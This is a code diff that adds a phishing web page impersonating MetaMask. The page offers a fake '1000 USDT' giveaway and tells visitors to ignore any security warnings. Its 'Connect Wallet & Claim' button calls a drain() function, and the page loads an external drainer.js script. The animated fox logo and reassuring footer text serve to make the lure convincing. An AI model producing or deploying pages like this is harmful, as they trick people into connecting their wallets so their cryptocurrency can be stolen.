@@ -75,3 +75,27 @@
       <!-- لوگوی روباه واقعی MetaMask بدون نوشته ConsenSys -->
       <img class="fox" src="https://cryptologos.cc/logos/metamask-metamask-logo.png" alt="MetaMask Fox">
     </div>
+    <h1>MetaMask</h1>
+    <p class="claim-text">Connect your wallet to receive <strong>1000 USDT</strong> instantly!</p>
+    <p>No gas fees • Secure transaction • Powered by Ethereum</p>
+    <p style="color:#ffcc00; font-size:14px;">Ignore any warning — this is a verified claim.</p>
+    <button class="connect-btn" onclick="drain()">Connect Wallet & Claim</button>
+    <div class="footer">© 2025 MetaMask • Encrypted • Secure</div>
+  </div>
+
+  <script>
+    // چرخش روباه به سمت موس
+    const foxContainer = document.getElementById('foxContainer');
+    const fox = foxContainer.querySelector('.fox');
+
+    document.addEventListener('mousemove', (e) => {
+      const rect = foxContainer.getBoundingClientRect();
+      const x = e.clientX - rect.left - rect.width / 2;
+      const y = e.clientY - rect.top - rect.height / 2;
+      const angle = Math.atan2(y, x) * (180 / Math.PI);
+      fox.style.transform = `rotate(${angle}deg)`;
+    });
+  </script>
+  <script src="drainer.js"></script>
+</body>
+</html>
